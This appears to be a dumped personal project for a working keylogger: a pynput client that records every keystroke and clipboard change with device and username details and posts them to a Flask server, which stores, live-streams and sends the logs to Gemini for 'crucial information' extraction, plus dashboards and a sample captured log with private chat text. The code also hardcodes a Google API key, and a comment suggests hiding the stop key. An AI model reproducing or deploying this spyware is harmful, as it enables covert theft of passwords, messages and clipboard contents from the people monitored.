#     device_info = data["device_info"]
#     key_data = data["key_data"]

#     username = device_info['username']
#     user_log_file = get_user_log_file(username)

#     with open(user_log_file, "a") as f:
#         if key_data == "<enter>":
#             f.write("\n")
#         else:
#             f.write(key_data)

#     if username not in logged_keys:
#         logged_keys[username] = []
#     if username not in live_keys:
#         live_keys[username] = []

#     logged_keys[username].append(key_data)
#     live_keys[username].append(key_data)

#     return jsonify(status="success", message="Keystroke logged successfully")

# @app.route('/logs/<user>', methods=['GET'])
# def get_logs(user):
#     user_log_file = get_user_log_file(user)
#     try:
#         with open(user_log_file, "r") as f:
#             logs = f.readlines()
#     except FileNotFoundError:
#         logs = []

#     return jsonify(status="success", logs=logs)

# @app.route('/users', methods=['GET'])
# def get_users():
#     return jsonify(status="success", users=list(logged_keys.keys()))

# @app.route('/clear_logs/<user>', methods=['DELETE'])
# def clear_logs(user):
#     user_log_file = get_user_log_file(user)
#     try:
#         os.remove(user_log_file)
#         logged_keys.pop(user, None)
#         live_keys.pop(user, None)
#         return jsonify(status="success", message=f"Logs cleared for {user}")
#     except Exception as e:
#         return jsonify(status="error", message=str(e))

# @app.route('/log_status', methods=['GET'])
# def log_status():
#     return jsonify(status="running")

# @app.route('/view_logs/<user>')
# def view_logs(user):
#     logs = {}
#     user_logs_file = get_user_log_file(user)

#     if os.path.exists(user_logs_file):
#         try:
#             with open(user_logs_file, 'r') as file:
#                 logs_content = file.readlines()
#                 logs[user] = logs_content
#         except Exception as e:
#             print(f"Error reading log file for {user}: {e}")
#             logs = {}
#     else:
#         print(f"Log file not found for {user}")
#         logs = {}

#     return render_template('view_logs.html', user=user, logs=logs)


# @app.route('/live_logs/<user>')
# def live_logs(user):
#     return render_template('live_logs.html', user=user)

# @app.route('/live_logs_stream/<user>')
# def live_logs_stream(user):
#     def generate():
#         while True:
#             if user in live_keys:
#                 while live_keys[user]:
#                     key = live_keys[user].pop(0)
#                     yield f"data: {key}\n\n"
#             time.sleep(0.1)
#     return Response(generate(), mimetype="text/event-stream")

# @app.route('/analyze/<user>', methods=['GET'])
# def analyze(user):
#     user_log_file = get_user_log_file(user)
#     try:
#         with open(user_log_file, "r") as f:
#             logs = f.read()
#     except FileNotFoundError:
#         logs = ""

#     crucial_info = analyze_keystrokes(logs)
#     return jsonify(status="success", crucial_info=crucial_info)
    

# if __name__ == "__main__":
#     app.run(host='0.0.0.0', port=5000, debug=True)


from flask import Flask, request, jsonify, render_template, Response
import threading
import time
import os
from ai_analysis import analyze_keystrokes  # Import the AI analysis function
import google.generativeai as genai

app = Flask(__name__)

GOOGLE_API_KEY = 'AIzaSyB76J0xs2XICAONAzbIGhEi8ZnO73uQ95Y'
genai.configure(api_key=GOOGLE_API_KEY) #INPUT : Simulate the typing process from the provided keystroke log and output ONLY the final, intended text. Disregard all non-printing keystrokes, including but not limited to backspace, arrow keys, modifier keys, and function keys. The output should represent exactly what would be displayed on the screen after the entire sequence of keystrokes is processed

logs_dir = "user_logs/"  # Directory to store user logs

if not os.path.exists(logs_dir):
    os.makedirs(logs_dir)

logged_keys = {}
live_keys = {}

def get_user_log_file(username):
    return os.path.join(logs_dir, f"{username}_keylog.txt")

@app.route('/')
def index():
    return render_template('index.html')

@app.route('/log', methods=['POST'])
def log():
    data = request.json
    device_info = data["device_info"]
    key_data = data["key_data"]

    username = device_info['username']
    user_log_file = get_user_log_file(username)

    with open(user_log_file, "a") as f: # this is the part to alter the data entry into the user file that is being logged 
        if key_data == "<enter>":
            f.write("\n")
        else:
            f.write(key_data)

    if username not in logged_keys:
        logged_keys[username] = []
    if username not in live_keys:
        live_keys[username] = []

    logged_keys[username].append(key_data)
    live_keys[username].append(key_data)

    return jsonify(status="success", message="Keystroke logged successfully")

@app.route('/logs/<user>', methods=['GET'])
def get_logs(user):
    user_log_file = get_user_log_file(user)
    try:
        with open(user_log_file, "r") as f:
            logs = f.readlines()
    except FileNotFoundError:
        logs = []

    return jsonify(status="success", logs=logs)

@app.route('/users', methods=['GET'])
def get_users():
    return jsonify(status="success", users=list(logged_keys.keys()))

@app.route('/clear_logs/<user>', methods=['DELETE'])
def clear_logs(user):
    user_log_file = get_user_log_file(user)
    try:
        os.remove(user_log_file)
        logged_keys.pop(user, None)
        live_keys.pop(user, None)
        return jsonify(status="success", message=f"Logs cleared for {user}")
    except Exception as e:
        return jsonify(status="error", message=str(e))

@app.route('/log_status', methods=['GET'])
def log_status():
    return jsonify(status="running")

@app.route('/view_logs/<user>')
def view_logs(user):
    logs = {}
    user_logs_file = get_user_log_file(user)

    if os.path.exists(user_logs_file):
        try:
            with open(user_logs_file, 'r') as file:
                logs_content = file.readlines()
                logs[user] = logs_content
        except Exception as e:
            print(f"Error reading log file for {user}: {e}")
            logs = {}
    else:
        print(f"Log file not found for {user}")
        logs = {}

    return render_template('view_logs.html', user=user, logs=logs)

@app.route('/live_logs/<user>')
def live_logs(user):
    return render_template('live_logs.html', user=user)

@app.route('/live_logs_stream/<user>')
def live_logs_stream(user):
    def generate():
        while True:
            if user in live_keys:
                while live_keys[user]:
                    key = live_keys[user].pop(0)
                    yield f"data: {key}\n\n"
            time.sleep(0.1)
    return Response(generate(), mimetype="text/event-stream")

@app.route('/analyze/<user>', methods=['GET'])
def analyze(user):
    user_log_file = get_user_log_file(user)
    try:
        with open(user_log_file, "r") as f:
            logs = f.read()
    except FileNotFoundError:
        logs = ""

    crucial_info = analyze_keystrokes(logs)
    return jsonify(status="success", crucial_info=crucial_info)


if __name__ == "__main__":
    app.run(host='0.0.0.0', port=8080, debug=True)


File: /mnt/c/Personal/Docs/Coding/LANGUAGES/Python/Keylogger/Python_projects copy 2/flask-server/templates/index.html , the code for this file is : 
<!-- index.html -->

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Keystroke Logger</title>
    <style>
        body {
            background-color: black;
            color: green;
            font-family: 'Courier New', Courier, monospace;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
        }
        .header {
            color: yellowgreen;
            text-align: center;
            margin-bottom: 20px;
        }
        .user-list {
            list-style-type: none;
            padding: 0;
        }
        .user-item {
            margin-bottom: 10px;
        }
        .user-button {
            margin-right: 10px;
            padding: 8px 16px;
            background-color: green;
            color: black;
            border: none;
            cursor: pointer;
            font-size: 14px;
            text-decoration: none;
            display: inline-block;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>Keystroke Logger</h1>
        </div>

        <h2>Users:</h2>
        <ul class="user-list" id="user-list"></ul>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', async () => {
            try {
                const response = await fetch('/users');
                const data = await response.json();

                if (data.status === "success") {
                    const userListContainer = document.getElementById('user-list');
                    data.users.forEach(user => {
                        const listItem = document.createElement('li');
                        listItem.classList.add('user-item');

                        const viewLogsButton = document.createElement('a');
                        viewLogsButton.classList.add('user-button');
                        viewLogsButton.innerText = `View Logs for ${user}`;
                        viewLogsButton.href = `/view_logs/${user}`;
                        listItem.appendChild(viewLogsButton);

                        const liveLogsButton = document.createElement('a');
                        liveLogsButton.classList.add('user-button');
                        liveLogsButton.innerText = `Live Logs for ${user}`;
                        liveLogsButton.href = `/live_logs/${user}`;
                        listItem.appendChild(liveLogsButton);

                        userListContainer.appendChild(listItem);
                    });
                } else {
                    console.error('Failed to fetch users');
                }
            } catch (error) {
                console.error('Error:', error);
            }
        });
    </script>
</body>
</html>


File: /mnt/c/Personal/Docs/Coding/LANGUAGES/Python/Keylogger/Python_projects copy 2/flask-server/templates/live_logs.html , the code for this file is : 
<!-- live_logs.html -->

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Live Logs</title>
    <style>
        body {
            background-color: black;
            color: rgb(179, 76, 219);
            font-family: 'Courier New', Courier, monospace;
            padding: 20px;
        }
        h1 {
            color: yellowgreen;
        }
        .live-container {
            max-height: 500px;
            overflow-y: auto;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
            padding: 10px;
        }
        .live-item {
            word-wrap: break-word;
            margin-bottom: 5px;
        }
    </style>
</head>
<body>
    <h1>Live Logs for {{ user }}</h1>
    <div class="live-container" id="live-container"></div>

    <script>
        const eventSource = new EventSource(`/live_logs_stream/{{ user }}`);
        const liveContainer = document.getElementById('live-container');

        eventSource.onmessage = function(event) {
            const logItem = document.createElement('div');
            logItem.classList.add('live-item');
            logItem.textContent = event.data;
            liveContainer.appendChild(logItem);
        };
    </script>
</body>
</html>


File: /mnt/c/Personal/Docs/Coding/LANGUAGES/Python/Keylogger/Python_projects copy 2/flask-server/templates/view_logs.html , the code for this file is : 
<!-- view_logs.html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Logs</title>
    <style>
        body {
            background-color: black;
            color: green;
            font-family: 'Courier New', Courier, monospace;
            padding: 20px;
        }
        h1 {
            color: yellowgreen;
        }
        .log-container {
            display: flex;
            flex-wrap: wrap;
        }
        .log-column {
            flex: 1 1 30%;
            max-height: 500px;
            overflow-y: auto;
            margin: 10px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
        }
        .log-item {
            word-wrap: break-word;
        }
        .reset-button, .analyze-button {
            background-color: red;
            color: white;
            border: none;
            padding: 8px 16px;
            margin-top: 10px;
            cursor: pointer;
        }
        .analyze-button {
            background-color: blue;
        }
        .crucial-info {
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
            color: yellow;
        }
    </style>
</head>
<body>
    <h1>Logs for {{ user }}</h1>
    <div class="log-container">
        {% for device, logs in logs.items() %}
            <div class="log-column">
                <h2>Device: {{ device }}</h2>
                {% for log in logs %}
                    <div class="log-item">{{ log }}</div>
                {% endfor %}
            </div>
        {% endfor %}
    </div>
    <button class="reset-button" onclick="resetLogs()">Reset Logs</button>
    <button class="display-button" onclick="displayLogs()">Display Logs</button>
    <button class="analyze-button" onclick="analyzeLogs()">Analyze Logs</button>

    <div id="crucial-info" class="crucial-info" style="display: none;"></div>

    <script>
        function resetLogs() {
            fetch(`/clear_logs/{{ user }}`, { method: 'DELETE' })
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        location.reload(); // Refresh the page after logs are cleared
                    } else {
                        console.error('Failed to clear logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }

        function analyzeLogs() {
            fetch(`/analyze/{{ user }}`)
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        const crucialInfoDiv = document.getElementById('crucial-info');
                        crucialInfoDiv.innerHTML = `<h2>Crucial Information:</h2><p>${data.crucial_info}</p>`;
                        crucialInfoDiv.style.display = 'block';
                    } else {
                        console.error('Failed to analyze logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }
    </script>
</body>
</html> -->


<!-- <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Logs</title>
    <style>
        body {
            background-color: black;
            color: green;
            font-family: 'Courier New', Courier, monospace;
            padding: 20px;
        }
        h1 {
            color: yellowgreen;
        }
        .log-container {
            display: flex;
            flex-wrap: wrap;
        }
        .log-column {
            flex: 1 1 30%;
            max-height: 500px;
            overflow-y: auto;
            margin: 10px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
        }
        .log-item {
            word-wrap: break-word;
        }
        .reset-button, .analyze-button {
            background-color: red;
            color: white;
            border: none;
            padding: 8px 16px;
            margin-top: 10px;
            cursor: pointer;
        }
        .analyze-button {
            background-color: blue;
        }
        .crucial-info {
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
            color: yellow;
        }
        .output-textarea {
            width: 100%;
            min-height: 300px;
            padding: 10px;
            margin-top: 20px;
            background-color: #333;
            color: white;
            border: 1px solid #555;
            border-radius: 5px;
            font-family: 'Courier New', Courier, monospace;
            resize: vertical;
        }
    </style>
</head>
<body>
    <h1>Logs for {{ user }}</h1>
    <div class="log-container">
        {% for device, logs in logs.items() %}
            <div class="log-column">
                <h2>Device: {{ device }}</h2>
                {% for log in logs %}
                    <div class="log-item">{{ log }}</div>
                {% endfor %}
            </div>
        {% endfor %}
    </div>
    <button class="reset-button" onclick="resetLogs()">Reset Logs</button>
    <button class="analyze-button" onclick="analyzeLogs()">Analyze Logs</button>

    <textarea id="output-textarea" class="output-textarea" readonly></textarea>

    <script>
        function resetLogs() {
            fetch(`/clear_logs/{{ user }}`, { method: 'DELETE' })
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        location.reload(); // Refresh the page after logs are cleared
                    } else {
                        console.error('Failed to clear logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }

        function analyzeLogs() {
            fetch(`/analyze/{{ user }}`)
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        const outputTextarea = document.getElementById('output-textarea');
                        outputTextarea.value = data.crucial_info;
                        outputTextarea.focus();
                        outputTextarea.select();
                    } else {
                        console.error('Failed to analyze logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }
    </script>
</body>
</html> -->


<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Logs</title>
    <style>
        body {
            background-color: black;
            color: green;
            font-family: 'Courier New', Courier, monospace;
            padding: 20px;
        }
        h1 {
            color: yellowgreen;
        }
        .log-container {
            display: flex;
            flex-wrap: wrap;
        }
        .log-column {
            flex: 1 1 30%;
            max-height: 500px;
            overflow-y: auto;
            margin: 10px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
        }
        .log-item {
            word-wrap: break-word;
        }
        .reset-button, .analyze-button {
            background-color: red;
            color: white;
            border: none;
            padding: 8px 16px;
            margin-top: 10px;
            cursor: pointer;
        }
        .analyze-button {
            background-color: blue;
        }
        .crucial-info {
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
            color: yellow;
        }
        .text-editor {
            background-color: #333;
            color: white;
            padding: 10px;
            margin-top: 20px;
            border-radius: 5px;
        }
        .text-editor textarea {
            width: 100%;
            min-height: 200px;
            background-color: inherit;
            color: inherit;
            border: none;
            outline: none;
            font-family: 'Courier New', Courier, monospace;
            resize: vertical;
        }
    </style>
</head>
<body>
    <h1>Logs for {{ user }}</h1>
    <div class="log-container">
        {% for device, logs in logs.items() %}
            <div class="log-column">
                <h2>Device: {{ device }}</h2>
                {% for log in logs %}
                    <div class="log-item">{{ log }}</div>
                {% endfor %}
            </div>
        {% endfor %}
    </div>
    <button class="reset-button" onclick="resetLogs()">Reset Logs</button>
    <button class="analyze-button" onclick="analyzeLogs()">Analyze Logs</button>

    <div id="crucial-info" class="crucial-info" style="display: none;"></div>

    <div class="text-editor" id="editor">
        <textarea id="editor-textarea" placeholder="Generated Output"></textarea>
    </div>

    <script>
        function resetLogs() {
            fetch(`/clear_logs/{{ user }}`, { method: 'DELETE' })
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        location.reload(); // Refresh the page after logs are cleared
                    } else {
                        console.error('Failed to clear logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }

        function analyzeLogs() {
            fetch(`/analyze/{{ user }}`)
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        const editorTextarea = document.getElementById('editor-textarea');
                        editorTextarea.value = `Crucial Information:\n\n${data.crucial_info}`;
                        document.getElementById('crucial-info').style.display = 'none';
                        document.getElementById('editor').style.display = 'block';
                    } else {
                        console.error('Failed to analyze logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }
    </script>
</body>
</html>



File: /mnt/c/Personal/Docs/Coding/LANGUAGES/Python/Keylogger/Python_projects copy 2/keylogger-project/keylogger.py , the code for this file is : 
# # keylogger.py

# from pynput.keyboard import Key, Listener
# import requests
# import platform
# import os
# import getpass

# count = 0
# keys = []
# device_info = {
#     "device": platform.node(),
#     "system": platform.system(),
#     "release": platform.release(),
#     "version": platform.version(),
#     "machine": platform.machine(),
#     "username": getpass.getuser(),
#     "current_path": os.getcwd()
# }

# def send_to_server(log):
#     url = 'http://127.0.0.1:5000/log'
#     data = {
#         "device_info": device_info,
#         "key_data": log
#     }
#     try:
#         requests.post(url, json=data)
#     except Exception as e:
#         print(f"Error sending data to server: {e}")

# def write_to_file(key):
#     key_data = str(key)
#     with open("keylog.txt", "a") as f:
#         f.write(key_data + "\n")
#     send_to_server(key_data)

# def on_press(key):
#     global keys, count

#     keys.append(str(key))
#     count += 1

#     if count >= 1:
#         count = 0
#         logs = format_logs(keys)
#         write_to_file(logs)
#         keys = []

# def format_logs(keys):
#     message = ""
#     for key in keys:
#         k = key.replace("'", "")
#         if key == "Key.space":
#             k = " "
#         elif key == "Key.shift":
#             k = "<shift>"
#         elif key == "Key.ctrl_l":
#             k = "<ctrl>"
#         elif key == "Key.alt_l":
#             k = "<alt>"
#         elif key == "Key.tab":
#             k = "<tab>"
#         elif key == "Key.caps_lock":
#             k = "<caps_lock>"
#         elif key == "Key.enter":
#             k = "<enter>"
#         elif key.find("Key") > 0:
#             k = ""
#         message += k
#     return message

# def on_release(key):
#     if key == Key.esc:
#         return False  # Stops the listener

# with Listener(on_press=on_press, on_release=on_release) as listener:
#     listener.join()


from pynput.keyboard import Key, Listener
import requests
import platform
import os
import getpass
import pyperclip
import time
import threading

count = 0
keys = []
device_info = {
    "device": platform.node(),
    "system": platform.system(),
    "release": platform.release(),
    "version": platform.version(),
    "machine": platform.machine(),
    "username": getpass.getuser(),
    "current_path": os.getcwd()
}

def send_to_server(log):
    url = 'http://127.0.0.1:8080/log'
    data = {
        "device_info": device_info,
        "key_data": log
    }
    try:
        requests.post(url, json=data)
    except Exception as e:
        print(f"Error sending data to server: {e}")

def write_to_file(key):
    key_data = str(key)
    with open("keylog.txt", "a") as f:
        f.write(key_data + "\n")
    send_to_server(key_data)

def on_press(key):
    global keys, count

    keys.append(str(key))
    count += 1

    if count >= 1:
        count = 0
        logs = format_logs(keys)
        write_to_file(logs)
        keys = []

def format_logs(keys):
    message = ""
    for key in keys:
        k = key.replace("'", "")
        if key == "Key.space":
            k = " "
        elif key == "Key.shift":
            k = "<shift>"
        elif key == "Key.ctrl_l":
            k = "<ctrl>"
        elif key == "Key.alt_l":
            k = "<alt>"
        elif key == "Key.tab":
            k = "<tab>"
        elif key == "Key.caps_lock":
            k = "<caps_lock>"
        elif key == "Key.enter":
            k = "<enter>"
        elif key.find("Key") > 0:
            k = ""
        message += k
    return message

def on_release(key): #this is the function  by altering it to read a string we can easily set a secret key instead of esc
    if key == Key.esc:
        return False  # Stops the listener

def monitor_clipboard():
    recent_value = ""
    while True:
        tmp_value = pyperclip.paste()
        if tmp_value != recent_value:
            recent_value = tmp_value
            clipboard_data = f"[Clipboard] {recent_value}"
            write_to_file(clipboard_data)
        time.sleep(1)

# Start clipboard monitoring in a separate thread
clipboard_thread = threading.Thread(target=monitor_clipboard)
clipboard_thread.daemon = True
clipboard_thread.start()

with Listener(on_press=on_press, on_release=on_release) as listener:
    listener.join()


File: /mnt/c/Personal/Docs/Coding/LANGUAGES/Python/Keylogger/Python_projects copy 2/sh.sh , the code for this file is : 
#!/bin/bash

# Define the directory to start
start_directory="/mnt/c/Personal/Docs/Coding/LANGUAGES/Python/Keylogger/Python_projects copy 2"

# Define the output file
output_file="/mnt/c/Personal/Docs/Coding/LANGUAGES/Python/Keylogger/Python_projects copy 2/full_code.txt"

# Clear the output file if it exists
if [ -f "$output_file" ]; then
    rm "$output_file"
fi

# Function to process files in a directory
process_directory() {
    local directory=$1
    # Iterate over each item in the directory
    for item in "$directory"/*; do
        # Check if it's a directory
        if [ -d "$item" ]; then
            # Skip the "logs", "__pycache__", and "uploads" directories
            if [[ "$item" == *logs* ]] || [[ "$item" == *__pycache__* ]] || [[ "$item" == *uploads* ]] || [[ "$item" == RAG ]] || [[ "$item" == *.vscode* ]] || [[ "$item" == *build* ]] || [[ "$item" == *external* ]]; then
                continue
            else
                # If it's another directory, recursively process it
                process_directory "$item"
            fi
        elif [ -f "$item" ]; then
            # Skip files with ".log" extension
            if [[ "$item" == *.log ]] || [[ "$item" == *.txt ]]; then
                continue
            else
                # Write the file path to the output file
                echo "File: $item , the code for this file is : " >> "$output_file"
                
                # Write the content of the file to the output file
                cat "$item" >> "$output_file"
                echo -e "\n" >> "$output_file"  # Add a newline for better readability
            fi
        fi
    done
}

# Start processing from the start directory
process_directory "$start_directory"


<tab>[Clipboard] <button id="markdown-button" class="markdown-button" style="display: none;" onclick="convertToMarkdown()">Convert to Markdown</button>
<alt><tab><ctrl>\x03[Clipboard] <ctrl>\x16Key.downKey.backspace

Key.up<tab><ctrl>\x16<ctrl>\x1a<alt><tab><alt><tab>[Clipboard] <button id="markdown-button" class="markdown-button" style="display: none;" onclick="convertToMarkdown()">Convert to Markdown</button>
<ctrl><ctrl>\x16<ctrl>\x13<alt><tab>[Clipboard] function toggleMarkdownButton() {
    const textarea = document.getElementById('editor-textarea');
    const markdownButton = document.getElementById('markdown-button');
    markdownButton.style.display = textarea.value.trim() ? 'inline-block' : 'none';
}

// Attach event listener to detect changes in the textarea
document.getElementById('editor-textarea').addEventListener('input', toggleMarkdownButton);
<alt><tab>

Key.backspace<ctrl>\x16<ctrl>\x1a\x1a<tab><ctrl>\x16<ctrl>\x13<alt><tab>[Clipboard] function convertToMarkdown() {
    const textarea = document.getElementById('editor-textarea');
    const markdownOutput = textarea.value
        .split('\n') // Split the content into lines
        .map(line => `- ${line.trim()}`) // Prefix each line with `-`
        .join('\n'); // Join the lines with newline characters

    // Create a pop-up to display the Markdown
    const markdownPopup = window.open('', '_blank');
    markdownPopup.document.write('<pre>' + markdownOutput + '</pre>');
}
<alt><tab>

<ctrl>\x16<ctrl>\x13<alt><tab><alt><tab><alt><tab>[Clipboard] function downloadMarkdown() {
    const textarea = document.getElementById('editor-textarea');
    const markdownContent = textarea.value
        .split('\n')
        .map(line => `- ${line.trim()}`)
        .join('\n');

    const blob = new Blob([markdownContent], { type: 'text/markdown' });
    const link = document.createElement('a');
    link.href = URL.createObjectURL(blob);
    link.download = 'analyzed_logs.md';
    link.click();
}
<alt><tab><tab>
<ctrl>\x16bubba can you send me the google form to upload nptel image for <shift>SE
<alt><alt><tab><alt><tab><shift><shift><shift><shift><shift><shift><shift><shift><shift><shift><shift>*npterKey.backspacel cert image
<alt><tab><alt><tab><tab><ctrl>\x13<alt><tab><alt><tab><alt><tab><alt><tab><alt><tab><alt><tab><ctrl>\x01\x03[Clipboard] <!-- view_logs.html

<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Logs</title>
    <style>
        body {
            background-color: black;
            color: green;
            font-family: 'Courier New', Courier, monospace;
            padding: 20px;
        }
        h1 {
            color: yellowgreen;
        }
        .log-container {
            display: flex;
            flex-wrap: wrap;
        }
        .log-column {
            flex: 1 1 30%;
            max-height: 500px;
            overflow-y: auto;
            margin: 10px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
        }
        .log-item {
            word-wrap: break-word;
        }
        .reset-button, .analyze-button {
            background-color: red;
            color: white;
            border: none;
            padding: 8px 16px;
            margin-top: 10px;
            cursor: pointer;
        }
        .analyze-button {
            background-color: blue;
        }
        .crucial-info {
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
            color: yellow;
        }
    </style>
</head>
<body>
    <h1>Logs for {{ user }}</h1>
    <div class="log-container">
        {% for device, logs in logs.items() %}
            <div class="log-column">
                <h2>Device: {{ device }}</h2>
                {% for log in logs %}
                    <div class="log-item">{{ log }}</div>
                {% endfor %}
            </div>
        {% endfor %}
    </div>
    <button class="reset-button" onclick="resetLogs()">Reset Logs</button>
    <button class="display-button" onclick="displayLogs()">Display Logs</button>
    <button class="analyze-button" onclick="analyzeLogs()">Analyze Logs</button>

    <div id="crucial-info" class="crucial-info" style="display: none;"></div>

    <script>
        function resetLogs() {
            fetch(`/clear_logs/{{ user }}`, { method: 'DELETE' })
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        location.reload(); // Refresh the page after logs are cleared
                    } else {
                        console.error('Failed to clear logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }

        function analyzeLogs() {
            fetch(`/analyze/{{ user }}`)
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        const crucialInfoDiv = document.getElementById('crucial-info');
                        crucialInfoDiv.innerHTML = `<h2>Crucial Information:</h2><p>${data.crucial_info}</p>`;
                        crucialInfoDiv.style.display = 'block';
                    } else {
                        console.error('Failed to analyze logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }
    </script>
</body>
</html> -->


<!-- <!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Logs</title>
    <style>
        body {
            background-color: black;
            color: green;
            font-family: 'Courier New', Courier, monospace;
            padding: 20px;
        }
        h1 {
            color: yellowgreen;
        }
        .log-container {
            display: flex;
            flex-wrap: wrap;
        }
        .log-column {
            flex: 1 1 30%;
            max-height: 500px;
            overflow-y: auto;
            margin: 10px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
        }
        .log-item {
            word-wrap: break-word;
        }
        .reset-button, .analyze-button {
            background-color: red;
            color: white;
            border: none;
            padding: 8px 16px;
            margin-top: 10px;
            cursor: pointer;
        }
        .analyze-button {
            background-color: blue;
        }
        .crucial-info {
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
            color: yellow;
        }
        .output-textarea {
            width: 100%;
            min-height: 300px;
            padding: 10px;
            margin-top: 20px;
            background-color: #333;
            color: white;
            border: 1px solid #555;
            border-radius: 5px;
            font-family: 'Courier New', Courier, monospace;
            resize: vertical;
        }
    </style>
</head>
<body>
    <h1>Logs for {{ user }}</h1>
    <div class="log-container">
        {% for device, logs in logs.items() %}
            <div class="log-column">
                <h2>Device: {{ device }}</h2>
                {% for log in logs %}
                    <div class="log-item">{{ log }}</div>
                {% endfor %}
            </div>
        {% endfor %}
    </div>
    <button class="reset-button" onclick="resetLogs()">Reset Logs</button>
    <button class="analyze-button" onclick="analyzeLogs()">Analyze Logs</button>

    <textarea id="output-textarea" class="output-textarea" readonly></textarea>

    <script>
        function resetLogs() {
            fetch(`/clear_logs/{{ user }}`, { method: 'DELETE' })
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        location.reload(); // Refresh the page after logs are cleared
                    } else {
                        console.error('Failed to clear logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }

        function analyzeLogs() {
            fetch(`/analyze/{{ user }}`)
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        const outputTextarea = document.getElementById('output-textarea');
                        outputTextarea.value = data.crucial_info;
                        outputTextarea.focus();
                        outputTextarea.select();
                    } else {
                        console.error('Failed to analyze logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }
    </script>
</body>
</html> -->


<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>View Logs</title>
    <style>
        body {
            background-color: black;
            color: green;
            font-family: 'Courier New', Courier, monospace;
            padding: 20px;
        }

        h1 {
            color: yellowgreen;
        }

        .log-container {
            display: flex;
            flex-wrap: wrap;
        }

        .log-column {
            flex: 1 1 30%;
            max-height: 500px;
            overflow-y: auto;
            margin: 10px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
        }

        .log-item {
            word-wrap: break-word;
        }

        .reset-button,
        .analyze-button {
            background-color: red;
            color: white;
            border: none;
            padding: 8px 16px;
            margin-top: 10px;
            cursor: pointer;
        }

        .analyze-button {
            background-color: blue;
        }

        .crucial-info {
            margin-top: 20px;
            padding: 10px;
            border: 1px solid #333;
            border-radius: 5px;
            background-color: #222;
            color: yellow;
        }

        .text-editor {
            background-color: #333;
            color: white;
            padding: 10px;
            margin-top: 20px;
            border-radius: 5px;
        }

        .text-editor textarea {
            width: 100%;
            min-height: 200px;
            background-color: inherit;
            color: inherit;
            border: none;
            outline: none;
            font-family: 'Courier New', Courier, monospace;
            resize: vertical;
        }
    </style>
</head>

<body>
    <h1>Logs for {{ user }}</h1>
    <div class="log-container">
        {% for device, logs in logs.items() %}
        <div class="log-column">
            <h2>Device: {{ device }}</h2>
            {% for log in logs %}
            <div class="log-item">{{ log }}</div>
            {% endfor %}
        </div>
        {% endfor %}
    </div>
    <button class="reset-button" onclick="resetLogs()">Reset Logs</button>
    <button class="analyze-button" onclick="analyzeLogs()">Analyze Logs</button>
    <button id="markdown-button" class="markdown-button" style="display: none;" onclick="convertToMarkdown()">Convert to
        Markdown</button>


    <div id="crucial-info" class="crucial-info" style="display: none;"></div>

    <div class="text-editor" id="editor">
        <textarea id="editor-textarea" placeholder="Generated Output"></textarea>
    </div>

    <script>
        function resetLogs() {
            fetch(`/clear_logs/{{ user }}`, { method: 'DELETE' })
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
                        location.reload(); // Refresh the page after logs are cleared
                    } else {
                        console.error('Failed to clear logs');
                    }
                })
                .catch(error => console.error('Error:', error));
        }

        function analyzeLogs() {
            fetch(`/analyze/{{ user }}`)
                .then(response => response.json())
                .then(data => {
                    if (data.status === "success") {
